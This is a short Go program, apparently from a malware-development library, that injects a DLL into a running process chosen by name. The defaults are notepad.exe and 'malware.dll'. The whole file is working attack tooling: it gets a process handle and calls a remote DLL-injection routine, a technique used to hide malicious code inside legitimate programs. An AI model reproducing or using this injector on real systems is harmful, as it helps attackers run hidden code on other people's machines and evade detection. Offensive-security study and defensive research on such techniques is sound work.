package main

import (
	"flag"
	"log"

	"github.com/mortimus/maldev/pkg/maldev"
)

func main() {
	maldev.DEBUG = true
	// get process name from flags
	processName := flag.String("process", "notepad.exe", "Process name to inject into")
	dllName := flag.String("dll", "malware.dll", "DLL to inject")
	flag.Parse()
	pid, hProcess, err := maldev.GetProcessHandle(*processName)
	if err != nil {
		log.Fatalf("Failed to get process handle: %s\n", err)
	}
	defer maldev.CloseHandle(hProcess)
	maldev.Debugf("Found Process %s with PID %d\n", *processName, *pid)
	var wDLLName maldev.LPWSTR
	err = wDLLName.Set(*dllName)
	if err != nil {
		log.Fatalf("Failed to convert DLL name to LPWSTR: %s\n", err)
	}
	maldev.Debugf("Injecting %s into %s\n", *dllName, *processName)
	maldev.DebugWait("Inject")
	err = maldev.InjectDllToRemoteProcess(hProcess, wDLLName)
	if err != nil {
		log.Fatalf("Failed to inject DLL: %s\n", err)
	}
}
